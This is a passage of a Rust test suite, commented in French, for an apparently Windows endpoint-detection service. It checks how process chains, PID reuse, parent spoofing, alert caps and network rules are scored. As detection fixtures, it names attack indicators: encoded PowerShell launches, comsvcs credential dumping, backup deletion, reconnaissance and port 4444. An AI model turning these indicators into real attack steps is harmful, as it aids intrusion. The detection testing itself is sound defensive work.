// centaines de fois la même commande encodée sous le même parent

fn liste_t1(processus: &[(u32, &str, u32)]) -> std::collections::HashMap<u32, crate::natif::InfoListe> {
    processus.iter().map(|&(pid, nom, parent)| (pid, crate::natif::InfoListe { nom: nom.into(), parent })).collect()
}

/// Consigne du mainteneur : un PID réutilisé par un processus de même nom, un signal sur chacun des deux processus :
/// aucune chaîne commune (avant : les deux signaux s'ajoutaient sur le même nœud, 14 points, alerte Critique)
#[test]
fn t1_pid_reutilise_meme_nom_aucune_chaine_commune() {
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4), (200, "bash", 4)], &[]);
    arbre.creation(300, Some(100), r"C:\P\pwsh.exe", Some("pwsh -c a"));
    arbre.signaler(300, 7, "premier pwsh");
    // Le premier pwsh se termine (absent de deux listes), puis le PID 300 est repris par un autre pwsh
    arbre.maj(&liste_t1(&[(100, "outil", 4), (200, "bash", 4)]));
    arbre.maj(&liste_t1(&[(100, "outil", 4), (200, "bash", 4)]));
    arbre.creation(300, Some(200), r"C:\P\pwsh.exe", Some("pwsh -c b"));
    arbre.signaler(300, 7, "second pwsh");
    let chaines = arbre.chaines();
    assert!(chaines.iter().all(|c| c.noeuds.iter().all(|n| !n.raisons.contains("premier"))), "signaux de l'ancien processus effacés");
    assert!(arbre.alertes(&chaines).is_empty());
    // Même parent, même nom, deux créations (deux 4688) : deux processus, jamais un seul nœud qui cumule
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4)], &[]);
    arbre.creation(300, Some(100), r"C:\P\pwsh.exe", Some("pwsh -c a"));
    arbre.signaler(300, 7, "premier pwsh");
    arbre.creation(300, Some(100), r"C:\P\pwsh.exe", Some("pwsh -c a"));
    arbre.signaler(300, 7, "second pwsh");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "même nom, même parent");
    // Vu par la liste seulement : absent d'une liste (terminé), puis de retour sous le même nom et le même parent :
    // un autre processus (un processus terminé ne revient pas)
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4), (300, "pwsh", 100)], &[]);
    arbre.signaler(300, 7, "premier pwsh");
    arbre.maj(&liste_t1(&[(100, "outil", 4)]));
    arbre.maj(&liste_t1(&[(100, "outil", 4), (300, "pwsh", 100)]));
    arbre.signaler(300, 7, "second pwsh");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "retour dans la liste après sa fin");
}

/// Suite de 4688 rejouée : cmd (PID 1111) lance pwsh, se termine ; le PID 1111 est repris par git, puis par grep, puis
/// par un autre grep. pwsh n'est jamais rattaché à grep, né après lui (motif observé : « grep → pwsh », « tail → bash »)
#[test]
fn t1_parent_ne_apres_l_enfant_ecarte() {
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4)], &[]);
    arbre.creation(1111, Some(100), r"C:\W\System32\cmd.exe", Some("cmd /c x"));
    arbre.creation(2222, Some(1111), r"C:\P\pwsh.exe", Some("pwsh -c x"));
    arbre.creation(1111, Some(100), r"C:\G\git.exe", None);
    arbre.creation(1111, Some(100), r"C:\G\grep.exe", None);
    arbre.creation(1111, Some(100), r"C:\G\grep.exe", None);
    arbre.signaler(2222, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(1111, 7, "réseau : IP DIRECTE");
    let chaines = arbre.chaines();
    assert!(!chaines.iter().any(|c| c.resume.contains("grep → pwsh")), "{:?}", chaines.iter().map(|c| c.resume.clone()).collect::<Vec<_>>());
    assert!(arbre.alertes(&chaines).is_empty());
    // Heures de création du journal (TimeCreated) : même décision quand les 4688 arrivent dans le désordre
    let mut arbre = crate::chaines::Arbre::default();
    let t = 134_000_000_000_000_000u64;
    arbre.creation_a(100, Some(4), r"C:\O\outil.exe", None, Some(t));
    arbre.creation_a(1111, Some(100), r"C:\G\grep.exe", None, Some(t + 50_000_000));
    arbre.creation_a(2222, Some(1111), r"C:\P\pwsh.exe", None, Some(t + 10_000_000));
    arbre.signaler(2222, 5, "a");
    arbre.signaler(1111, 7, "b");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "parent né après l'enfant");
}

/// Parent terminé avant la création de l'enfant (sa création manque, l'enfant n'est vu que par la liste) : l'enfant est
/// sa propre racine
#[test]
fn t1_parent_mort_avant_l_enfant_ecarte() {
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4), (500, "MpCmdRun", 100)], &[]);
    arbre.maj(&liste_t1(&[(100, "outil", 4)]));
    arbre.maj(&liste_t1(&[(100, "outil", 4), (600, "pwsh", 500)]));
    arbre.signaler(500, 7, "a");
    arbre.signaler(600, 5, "b");
    let chaines = arbre.chaines();
    assert!(!chaines.iter().any(|c| c.resume.contains("MpCmdRun → pwsh")));
    assert!(arbre.alertes(&chaines).is_empty());
    // Parent bref connu par son seul 4688 (jamais dans une liste) : absent des listes suivantes, il est terminé ; un
    // enfant vu ensuite par la liste avec son PID pour parent n'est pas le sien
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4)], &[]);
    arbre.creation(500, Some(100), r"C:\W\cmd.exe", None);
    arbre.maj(&liste_t1(&[(100, "outil", 4)]));
    arbre.maj(&liste_t1(&[(100, "outil", 4)]));
    arbre.maj(&liste_t1(&[(100, "outil", 4), (600, "pwsh", 500)]));
    arbre.signaler(500, 7, "a");
    arbre.signaler(600, 5, "b");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "parent connu par son 4688, terminé avant l'enfant");
    // Parent vivant à la création de l'enfant (même liste) : la chaîne reste
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4), (500, "MpCmdRun", 100), (600, "pwsh", 500)], &[]);
    arbre.signaler(500, 7, "a");
    arbre.signaler(600, 5, "b");
    assert_eq!(arbre.alertes(&arbre.chaines()).len(), 1);
}

/// Programmes lancés par le service (auditpol, icacls, powershell et leurs conhost) : hors chaîne, leurs signaux ne
/// comptent pas. Le service est reconnu par son propre PID (celui du processus qui tourne), jamais par un nom. Puis le
/// PID d'auditpol est repris par un vrai programme de l'utilisateur : sa chaîne ne remonte pas au service
#[test]
fn t1_descendants_du_service_hors_chaine() {
    let service = std::process::id();
    let sys = format!(r"{}\System32", crate::natif::dossier_windows());
    let (auditpol, icacls, powershell) = (format!(r"{sys}\auditpol.exe"), format!(r"{sys}\icacls.exe"), format!(r"{sys}\WindowsPowerShell\v1.0\powershell.exe"));
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4), (service, "deR4TizerSvc", 50), (700, "auditpol", service), (701, "conhost", 700),
        (710, "icacls", service), (720, "powershell", service)], &[(700, &auditpol), (710, &icacls), (720, &powershell)]);
    arbre.signaler(700, 7, "a");
    arbre.signaler(701, 5, "b");
    arbre.signaler(710, 5, "c");
    arbre.signaler(720, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(service, 5, "d");
    let chaines = arbre.chaines();
    assert!(chaines.is_empty(), "{:?}", chaines.iter().map(|c| c.resume.clone()).collect::<Vec<_>>());
    assert!(arbre.alertes(&chaines).is_empty());
    // auditpol et conhost se terminent ; le PID 700 est repris par pwsh (lancé par l'outil de l'utilisateur), qui lance git
    arbre.maj(&liste_t1(&[(100, "outil", 4), (service, "deR4TizerSvc", 50)]));
    arbre.maj(&liste_t1(&[(100, "outil", 4), (service, "deR4TizerSvc", 50)]));
    arbre.creation(700, Some(100), r"C:\P\pwsh.exe", None);
    arbre.creation(702, Some(700), r"C:\G\git.exe", None);
    arbre.signaler(700, 7, "e");
    arbre.signaler(702, 5, "f");
    let chaines = arbre.chaines();
    assert_eq!(chaines.len(), 1);
    assert!(!chaines[0].resume.contains("deR4TizerSvc") && chaines[0].resume.contains("outil → pwsh → git"), "{}", chaines[0].resume);
    assert_eq!(arbre.alertes(&chaines).len(), 1);
}

/// Revue de #282 (2) : un administrateur qui crée un processus avec le service pour parent (T1134.004) ne le sort pas des
/// chaînes : un enfant du service qui n'est pas l'un de ses programmes (chemin exact sous System32) reste dans les
/// chaînes, signalé (parent usurpé probable) ; un auditpol du même nom hors de System32 aussi ; chemin inconnu : dans
/// les chaînes, sans signal
#[test]
fn t1_enfant_du_service_usurpe_signale() {
    let service = std::process::id();
    let mut arbre = arbre_avec_chemins(&[(service, "deR4TizerSvc", 50)], &[]);
    arbre.creation(800, Some(service), r"C:\Users\Public\outil.exe", None);
    arbre.creation(801, Some(800), r"C:\W\System32\whoami.exe", None);
    arbre.signaler(801, 7, "reconnaissance");
    let chaines = arbre.chaines();
    assert_eq!(chaines.len(), 1);
    assert!(chaines[0].noeuds.iter().any(|n| n.pid == 800 && n.raisons.contains("parent usurpé")), "{}", chaines[0].resume);
    let a = arbre.alertes(&chaines);
    assert_eq!(a.len(), 1);
    assert!(a[0].mitre.contains("T1134.004"));
    arbre.creation(810, Some(service), r"C:\Temp\auditpol.exe", None);
    assert!(arbre.chaines().iter().any(|c| c.noeuds.iter().any(|n| n.pid == 810)), "même nom, autre dossier : pas un programme du service");
    let mut arbre = arbre_avec_chemins(&[(service, "deR4TizerSvc", 50), (820, "inconnu", service)], &[]);
    arbre.signaler(820, 5, "a");
    assert_eq!(arbre.chaines().len(), 1, "chemin inconnu : reste dans les chaînes");
    assert!(!arbre.chaines()[0].noeuds[0].raisons.contains("parent usurpé"));
    let windows = crate::natif::dossier_windows();
    assert!(crate::chaines::programme_du_service(&format!(r"{windows}\SYSTEM32\WevtUtil.exe"), &windows));
    assert!(!crate::chaines::programme_du_service(&format!(r"{windows}\Temp\wevtutil.exe"), &windows));
    assert!(!crate::chaines::programme_du_service("", &windows));
}

/// Motif observé (cause principale) : un outil de développement lance des centaines de fois `cmd /c … pwsh
/// -EncodedCommand …` sous le même parent ; chaque lancement lève PRC-002 et s'ajoutait à la même chaîne, dont le score
/// montait sans fin (une alerte Critique toutes les quelques secondes). Le même comportement répété au même endroit de
/// la chaîne compte une fois ; une alerte au plus par niveau, trois au plus par chaîne et par heure, le surplus compté
#[test]
fn t1_comportement_repete_sous_le_meme_parent() {
    let mut arbre = arbre_avec_chemins(&[(100, "outil", 4), (110, "outil", 100)], &[]);
    arbre.signaler_code(110, 2, "réseau : IP DIRECTE (aucune requête DNS)", &[], "RES-002#ip-directe");
    let mut alertes = 0;
    for i in 0..200u32 {
        let (cmd, pwsh) = (1000 + 2 * i, 1001 + 2 * i);
        arbre.creation(cmd, Some(110), r"C:\W\System32\cmd.exe", Some("cmd /d /s /c chcp 65001 & pwsh -NoProfile -EncodedCommand QQBB"));
        arbre.creation(pwsh, Some(cmd), r"C:\P\pwsh.exe", Some("pwsh -NoProfile -NonInteractive -EncodedCommand QQBB"));
        arbre.signaler_code(cmd, 5, &format!("PowerShell obscurci ou qui télécharge du code : cmd {i}"), &[], "PRC-002#PRC-002:obscurci");
        arbre.signaler_code(pwsh, 5, &format!("PowerShell obscurci ou qui télécharge du code : pwsh {i}"), &[], "PRC-002#PRC-002:obscurci");
        alertes += arbre.alertes(&arbre.chaines()).len();
    }
    let chaines = arbre.chaines();
    assert_eq!(chaines.len(), 1);
    assert_eq!(chaines[0].score, 12, "répétitions comptées une fois");
    assert_eq!(alertes, 1, "une seule alerte pour 200 répétitions");
}

/// Plafond : une chaîne qui gagne sans cesse des comportements nouveaux lève trois alertes CHA-001 au plus par heure ;
/// les suivantes sont comptées (surplus publié dans mesures.json), jamais perdues sans trace
#[test]
fn t1_plafond_par_chaine_et_par_heure() {
    let mut arbre = arbre_de_test();
    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
    let mut alertes = 0;
    for i in 0..10 {
        arbre.signaler(400, 7, &format!("comportement {i}"));
        alertes += arbre.alertes(&arbre.chaines()).len();
    }
    assert_eq!(alertes, crate::chaines::PLAFOND_ALERTES_PAR_HEURE as usize);
    assert_eq!(arbre.alertes_plafonnees(), 10 - crate::chaines::PLAFOND_ALERTES_PAR_HEURE as u64);
    // Revue de #282 (1) : au-delà du plafond, une alerte qui apporte du nouveau passe toujours (comptée à part) : signal
    // fort (suppression des sauvegardes) puis technique ATT&CK nouvelle ; la même technique ensuite : retenue
    arbre.signaler_code(400, 9, "suppression des sauvegardes", &["T1490".to_string()], "PRC-005#PRC-005");
    assert_eq!(arbre.alertes(&arbre.chaines()).len(), 1, "signal fort");
    arbre.signaler_code(300, 2, "nouvelle technique", &["T1003.001".to_string()], "PRC-003#comsvcs");
    assert_eq!(arbre.alertes(&arbre.chaines()).len(), 1, "technique nouvelle");
    arbre.signaler_code(400, 2, "même technique", &["T1003.001".to_string()], "X");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "rien de nouveau : retenue");
    assert_eq!(arbre.alertes_hors_plafond(), 2);
    for (code, fort) in [("PRC-005#PRC-005", true), ("PRC-001#x", true), ("LEU-002#x", true), ("PRC-003#comsvcs", true), ("PRC-002#PRC-002:obscurci", false), ("", false)] {
        assert_eq!(crate::chaines::signal_fort(code), fort, "{code}");
    }
}

/// T-3 : l'entité d'incident d'une chaîne est son programme de tête (PID et heure de création), pas le texte de la chaîne :
/// une chaîne qui grossit reste un seul incident ; une autre chaîne fait un autre incident
#[test]
fn t3_entite_stable_quand_la_chaine_grossit() {
    let mut arbre = arbre_de_test();
    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
    let a1 = arbre.alertes(&arbre.chaines());
    arbre.creation(450, Some(400), r"C:\W\System32\whoami.exe", None);
    arbre.signaler(450, 3, "reconnaissance");
    let a2 = arbre.alertes(&arbre.chaines());
    assert_eq!((a1.len(), a2.len()), (1, 1));
    assert_ne!(a1[0].destination, a2[0].destination, "le texte de la chaîne a changé");
    assert_eq!(crate::incidents::entite(&a1[0]), crate::incidents::entite(&a2[0]));
    let mut autre = arbre_avec_chemins(&[(100, "explorer", 4), (900, "cmd", 100), (901, "powershell", 900)],
        &[(100, &format!(r"{}\explorer.exe", crate::natif::dossier_windows()))]);
    autre.signaler(900, 5, "a");
    autre.signaler(901, 7, "b");
    let a3 = autre.alertes(&autre.chaines());
    assert_ne!(crate::incidents::entite(&a1[0]), crate::incidents::entite(&a3[0]));
    // Chronologie : les événements du programme de tête sont rattachés (par le nom, signalé comme tel)
    let i = crate::incidents::IncidentSuivi { entite: crate::incidents::entite(&a1[0]), ..Default::default() };
    assert!(i.entite.starts_with("chaine:cmd#200@"), "{}", i.entite);
    let ev = |p: &str| crate::siem::Evenement { processus: p.into(), source: "processus".into(), ..Default::default() };
    assert_eq!(crate::incidents::lien(&i, &ev("cmd.exe")), Some(crate::incidents::Lien::ParNom));
    assert_eq!(crate::incidents::lien(&i, &ev("powershell.exe")), None);
    // Tête au chemin connu : entité « programme: » (même incident que les autres alertes de ce programme)
    let mut avec_chemin = arbre_avec_chemins(&[(100, "explorer", 4), (200, "outil", 100), (300, "powershell", 200), (400, "certutil", 300)],
        &[(100, &format!(r"{}\explorer.exe", crate::natif::dossier_windows()))]);
    avec_chemin.completer(200, r"C:\O\outil.exe", None);
    avec_chemin.signaler(300, 5, "a");
    avec_chemin.signaler(400, 7, "b");
    let a4 = avec_chemin.alertes(&avec_chemin.chaines());
    assert_eq!(crate::incidents::entite(&a4[0]), r"programme:c:\o\outil.exe");
    // Revue de #282 (3) : tête générique (interpréteur ou lanceur) au chemin connu : PID et heure de création, jamais le
    // chemin seul (deux chaînes sans lien qui partent de cmd.exe font deux incidents)
    let entite_cmd = |pid: u32| {
        let mut a = arbre_avec_chemins(&[(100, "explorer", 4), (pid, "cmd", 100), (pid + 1, "powershell", pid)],
            &[(100, &format!(r"{}\explorer.exe", crate::natif::dossier_windows()))]);
        a.completer(pid, r"C:\W\System32\cmd.exe", None);
        a.signaler(pid, 5, "a");
        a.signaler(pid + 1, 7, "b");
        crate::incidents::entite(&a.alertes(&a.chaines())[0])
    };
    let (e1, e2) = (entite_cmd(200), entite_cmd(600));
    assert!(e1.starts_with("chaine:cmd#200@") && e2.starts_with("chaine:cmd#600@"), "{e1} {e2}");
}

/// Bornes de `parent_vivait` : né à la même heure que l'enfant (oui), une unité après (non), vu terminé avant la création
/// de l'enfant (non), à l'heure même de sa fin (oui) ; parent vu d'abord par la liste : marge de 10 s, pas au-delà
#[test]
fn t1_parent_vivait_bornes() {
    use crate::chaines::parent_vivait;
    let t = 1_000_000_000u64;
    assert!(parent_vivait(t, true, None, t));
    assert!(!parent_vivait(t + 1, true, None, t));
    assert!(parent_vivait(t, true, Some(t + 5), t + 5));
    assert!(!parent_vivait(t, true, Some(t + 5), t + 6));
    assert!(parent_vivait(t + 100_000_000, false, None, t));
    assert!(!parent_vivait(t + 100_000_001, false, None, t));
}

/// Signal sur un PID inconnu de l'arbre (ni nom ni chemin) : pas de chaîne « PID 3333 » publiée
#[test]
fn t1_chaine_sans_nom_non_publiee() {
    let mut arbre = arbre_de_test();
    arbre.signaler(3333, 5, "PowerShell obscurci ou qui télécharge du code");
    assert!(arbre.chaines().is_empty());
}

/// Heure de création d'un 4688 (TimeCreated SystemTime, au 100 ns près) : parseur sans panique
#[test]
fn t1_heure_4688() {
    use crate::chaines::heure_4688;
    let xml = "<Event><System><EventID>4688</EventID><TimeCreated SystemTime='2020-01-02T03:04:05.1234567Z'/></System></Event>";
    let attendu = (crate::commun::secondes_utc("2020-01-02T03:04:05Z").unwrap() as u64 + 11_644_473_600) * 10_000_000 + 1_234_567;
    assert_eq!(heure_4688(xml), Some(attendu));
    assert_eq!(heure_4688(&xml.replace(".1234567", "")), Some(attendu - 1_234_567), "sans fraction");
    assert_eq!(heure_4688(&xml.replace(".1234567", ".5")), Some(attendu - 1_234_567 + 5_000_000), "fraction courte");
    assert_eq!(heure_4688(&xml.replace('\'', "\"")), Some(attendu), "guillemets doubles");
    for faux in ["", "<TimeCreated/>", "<TimeCreated SystemTime='2020-13-02T03:04:05Z'/>", "<TimeCreated SystemTime='x'/>",
        "<TimeCreated SystemTime='2020-01-02T03:04:05.12345678901Z'/>", "<TimeCreated SystemTime='2020-01-02T03:04:05.1é3Z'/>", "SystemTime='2020"] {
        assert_eq!(heure_4688(faux), None, "{faux}");
    }
    crate::tests::torturer_texte(xml, &mut |s| { let _ = heure_4688(s); });
}

/// Heures de création exactes : un PID repris par un processus de même nom est reconnu (heures différentes), un 4688 en
/// double (même heure) ne l'est pas, un 4688 en retard d'un ancien processus n'écrase jamais l'entrée plus récente
#[test]
fn t1_creation_heures_exactes() {
    let t = 134_000_000_000_000_000u64;
    let mut arbre = crate::chaines::Arbre::default();
    arbre.creation_a(100, Some(4), r"C:\O\outil.exe", None, Some(t));
    arbre.creation_a(300, Some(100), r"C:\P\pwsh.exe", None, Some(t + 1));
    arbre.signaler(300, 7, "a");
    arbre.creation_a(300, Some(100), r"C:\P\pwsh.exe", None, Some(t + 1));
    arbre.signaler(300, 7, "b");
    assert_eq!(arbre.chaines()[0].score, 14, "même 4688 lu deux fois : même processus");
    arbre.creation_a(300, Some(100), r"C:\P\pwsh.exe", None, Some(t + 9));
    assert!(arbre.chaines().is_empty(), "même nom, autre heure : PID repris, signaux effacés");
    arbre.signaler(300, 7, "c");
    arbre.creation_a(300, Some(100), r"C:\W\cmd.exe", None, Some(t + 5));
    assert_eq!(arbre.chaines()[0].noeuds.last().map(|n| n.nom.clone()), Some("pwsh".into()), "4688 en retard d'un ancien processus ignoré");
}

// ------------------------------------------------------------ RES et DNS : connexions et requêtes DNS (PR 3.8)
// Décisions pures du cycle de surveillance (moniteur::score_flux, regle_flux, premiere_connexion_signalee,
// alerte_adresses_publiques, alerte_dns), des ports en écoute (surveillances::ports_ouverts) et du journal du pare-feu
// (parefeu::exposition_reelle). Adresses de documentation (RFC 5737) seulement.

/// Indices d'une connexion banale : programme signé, nom DNS connu, port courant
fn indices_banals() -> crate::moniteur::IndicesFlux<'static> {
    crate::moniteur::IndicesFlux {
        menace: None, non_signe: false, dossier_temporaire: false, origine: None, suspicion_ligne: None, nom_dns_connu: true,
        navigateur_doh: false, application_ip_directe: false, dns_lu: true, preexistant: false, balise: None, port: 443,
        telemetrie: false, bloque: false,
    }
}

#[test]
fn res_001_positif() {
    use crate::moniteur::{regle_flux, score_flux, IndicesFlux};
    // Adresse d'une liste de menaces trouvée ; l'alerte part même pour une connexion déjà ouverte au démarrage
    let m = crate::menaces::menaces_test(&["203.0.113.66"], &[]);
    let source = m.chercher_ip("203.0.113.66").expect("adresse de la liste").source;
    let (score, raisons) = score_flux(&IndicesFlux { menace: Some(&source), ..indices_banals() });
    assert_eq!((score, raisons[0].as_str()), (10, "MENACE CONNUE (essai)"));
    assert_eq!(regle_flux(true, false, true, score), Some("RES-001"));
}

#[test]
fn res_001_negatif() {
    use crate::moniteur::regle_flux;
    // Une liste ne fait jamais signaler une adresse privée (imprimante, box) ; adresse publique absente de la liste
    let m = crate::menaces::menaces_test(&["203.0.113.66", "192.168.1.10"], &[]);
    assert!(m.chercher_ip("192.168.1.10").is_none());
    assert!(m.chercher_ip("203.0.113.67").is_none());
    assert_eq!(regle_flux(false, false, true, 0), None);
}

#[test]
fn res_002_positif() {
    use crate::moniteur::{regle_flux, score_flux, IndicesFlux};
    // Programme non signé : 3, au seuil
    let (score, raisons) = score_flux(&IndicesFlux { non_signe: true, ..indices_banals() });
    assert_eq!((score, raisons.join(", ").as_str()), (3, "NON SIGNÉ"));
    assert_eq!(regle_flux(false, true, false, score), Some("RES-002"));
    // IP directe (journal DNS lu, connexion nouvelle) et port inhabituel : 2 + 1
    let (score, raisons) = score_flux(&IndicesFlux { nom_dns_connu: false, port: 4444, ..indices_banals() });
    assert_eq!((score, raisons.join(", ").as_str()), (3, "IP DIRECTE (aucune requête DNS), port inhabituel 4444"));
    assert_eq!(regle_flux(false, true, false, score), Some("RES-002"));
    // Non signé, téléchargé depuis Internet hier, balise : 3 + 3 + 3 (balise forte : non signé)
    let (score, _) = score_flux(&IndicesFlux { non_signe: true, origine: Some(("téléchargé depuis Internet", 1)), balise: Some(60), ..indices_banals() });
    assert_eq!(score, 9);
    // Balise d'un programme signé : forte sans nom DNS (3, plus l'IP directe : 2), faible avec un nom (1)
    assert_eq!(score_flux(&IndicesFlux { nom_dns_connu: false, balise: Some(60), ..indices_banals() }).0, 5);
    assert_eq!(score_flux(&IndicesFlux { balise: Some(60), ..indices_banals() }).0, 1);
}

#[test]
fn res_002_negatif() {
    use crate::moniteur::{regle_flux, score_flux, IndicesFlux};
    // Connexion banale : 0
    assert_eq!(score_flux(&indices_banals()).0, 0);
    // Origine Internet d'un programme signé : pas comptée ; navigateur sans DNS (DoH) : pas compté
    assert_eq!(score_flux(&IndicesFlux { origine: Some(("téléchargé depuis Internet", 0)), ..indices_banals() }).0, 0);
    assert_eq!(score_flux(&IndicesFlux { nom_dns_connu: false, navigateur_doh: true, ..indices_banals() }).0, 0);
    // Journal DNS non lu, ou connexion déjà ouverte au démarrage : « nom DNS inconnu », sans indice
    let (score, raisons) = score_flux(&IndicesFlux { nom_dns_connu: false, dns_lu: false, ..indices_banals() });
    assert_eq!((score, raisons.join(", ").as_str()), (0, "nom DNS inconnu"));
    assert_eq!(score_flux(&IndicesFlux { nom_dns_connu: false, preexistant: true, ..indices_banals() }).0, 0);
    // Score au seuil mais connexion déjà vue, ou premier passage : rien
    assert_eq!(regle_flux(false, false, false, 5), None);
    assert_eq!(regle_flux(false, true, true, 5), None);
    assert_eq!(regle_flux(false, true, false, 2), None);
}

#[test]
fn res_003_positif() {
    assert!(crate::moniteur::premiere_connexion_signalee(false, false));
}

#[test]
fn res_003_negatif() {
    // Apprentissage, ou connexions déjà ouvertes au démarrage du service (premier passage)
    assert!(!crate::moniteur::premiere_connexion_signalee(true, false));
    assert!(!crate::moniteur::premiere_connexion_signalee(false, true));
}

/// Adresse publique sous la forme relevée par parefeu::adresses_publiques : « adresse (carte) »
fn releve(adresse: &str) -> String {
    format!("{adresse} (Wi-Fi)")
}

#[test]
fn res_004_positif() {
    use crate::moniteur::alerte_adresses_publiques;
    let a = alerte_adresses_publiques(&[], &[releve("203.0.113.7")]).expect("adresse apparue");
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("RES-004", "Alerte"));
    // PR 3.8 : une adresse publique qui en remplace une autre (même nombre d'adresses) alerte aussi
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7")], &[releve("198.51.100.9")]).is_some());
    // IPv6 : nouveau préfixe /64 (adresses de documentation, RFC 3849)
    assert!(alerte_adresses_publiques(&[releve("2001:db8:1:1::10")], &[releve("2001:db8:1:2::10")]).is_some());
}

#[test]
fn res_004_negatif() {
    use crate::moniteur::alerte_adresses_publiques;
    // Mêmes adresses, ou adresse disparue
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7")], &[releve("203.0.113.7")]).is_none());
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7"), releve("198.51.100.9")], &[releve("203.0.113.7")]).is_none());
    assert!(alerte_adresses_publiques(&[], &[]).is_none());
    // Relecture de #87, D1 et R2-D1 : adresse temporaire IPv6 renouvelée dans le même préfixe /64 (chaque jour, et à
    // chaque reconnexion), sous la forme relevée : pas une exposition nouvelle
    assert!(alerte_adresses_publiques(&[releve("2001:db8:1:1:a1b2:c3d4:e5f6:1")], &[releve("2001:db8:1:1:9f8e:7d6c:5b4a:2")]).is_none());
    assert!(alerte_adresses_publiques(&[releve("2001:db8:1:1::10"), releve("2001:db8:1:1:a1b2:c3d4:e5f6:1")],
                                      &[releve("2001:db8:1:1::10"), releve("2001:db8:1:1:9f8e:7d6c:5b4a:2")]).is_none());
    // Même adresse vue sur une autre carte : pas une exposition nouvelle
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7")], &["203.0.113.7 (Ethernet)".into()]).is_none());
}

/// Relecture de #87, R2-D1 : la forme lue par alerte_adresses_publiques est celle que parefeu::adresses_publiques produit
/// (contrôle du source : l'appel Windows ne s'exécute pas en test)
#[test]
fn res_004_forme_du_releve() {
    let p = include_str!("parefeu.rs").replace("\r\n", "\n");
    assert!(p.contains("l.push(format!(\"{ip} ({nom})\"));"), "forme « adresse (carte) » changée : revoir moniteur::reseau_public et releve()");
}

#[test]
fn res_005_positif() {
    use crate::parefeu::{exposition_reelle, ContexteExposition};
    // Paquet venu d'Internet vers un port en écoute (la chaîne complète, du journal à l'alerte, est exercée par
    // exposition_reelle_sans_faux_positifs)
    let ctx = ContexteExposition { ecoute_tcp: [3389u16].into_iter().collect(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    assert!(exposition_reelle("TCP", 3389, 9999, "-", &ctx));
    assert!(exposition_reelle("ICMP", 0, 9999, "8", &ctx), "demande d'écho venue d'Internet");
}

#[test]
fn res_005_negatif() {
    use crate::parefeu::{exposition_reelle, ContexteExposition};
    // Réponse à une connexion sortante (port éphémère, rien n'y écoute), réponse UDP, réponse d'écho
    let ctx = ContexteExposition { ecoute_tcp: [3389u16].into_iter().collect(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    assert!(!exposition_reelle("TCP", 51000, 9999, "-", &ctx));
    assert!(!exposition_reelle("UDP", 50003, 9999, "-", &ctx));
    assert!(!exposition_reelle("ICMP", 0, 9999, "0", &ctx));
}

/// Ports en écoute : un tour de surveillances::ports_ouverts, sans fichier ni appel Windows
fn tour_ports(connues: &mut std::collections::HashMap<String, String>, apprentissage: &mut bool, tcp: &[crate::natif::Connexion],
              signataire: &str) -> Vec<(String, String)> {
    let mut ecoutes = Vec::new();
    let mut alertes = Vec::new();
    let chemin_de = |pid: u32| if pid == 4 { String::new() } else { format!(r"C:\Outils\serveur{pid}.exe") };
    let sig = signataire.to_string();
    crate::surveillances::ports_ouverts(connues, apprentissage, &mut ecoutes, tcp, &chemin_de, &mut |_| sig.clone(), &mut alertes);
    alertes.into_iter().map(|a| (a.regle, a.niveau)).collect()
}

#[test]
fn res_006_positif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    // Premier relevé : apprentissage, rien ; puis un port nouveau, programme non signé : Alerte ; signé : Info
    let mut apprentissage = true;
    assert!(tour_ports(&mut connues, &mut apprentissage, &[Connexion::pour_test(700, 2, "0.0.0.0", 8000, "0.0.0.0", 0)], "").is_empty());
    assert!(!apprentissage);
    let ecoute = [Connexion::pour_test(700, 2, "0.0.0.0", 8000, "0.0.0.0", 0), Connexion::pour_test(701, 2, "0.0.0.0", 4444, "0.0.0.0", 0)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &ecoute, ""), [("RES-006".to_string(), "Alerte".to_string())]);
    let ecoute = [Connexion::pour_test(702, 2, "0.0.0.0", 9000, "0.0.0.0", 0)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Éditeur"), [("RES-006".to_string(), "Info".to_string())]);
}

#[test]
fn res_006_negatif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    let mut apprentissage = false;
    // Écoute sur la boucle locale ; port RPC dynamique de Windows ; port déjà connu
    let ecoute = [Connexion::pour_test(700, 2, "127.0.0.1", 8000, "0.0.0.0", 0), Connexion::pour_test(701, 2, "0.0.0.0", 49700, "0.0.0.0", 0)];
    assert!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Microsoft Windows").is_empty());
    let ecoute = [Connexion::pour_test(702, 2, "0.0.0.0", 8000, "0.0.0.0", 0)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Éditeur").len(), 1);
    assert!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Éditeur").is_empty(), "déjà connu");
}

#[test]
fn res_007_positif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    let mut apprentissage = true;
    // Connexion établie depuis Internet sur un port en écoute : Critique si le programme n'est pas signé, Alerte sinon
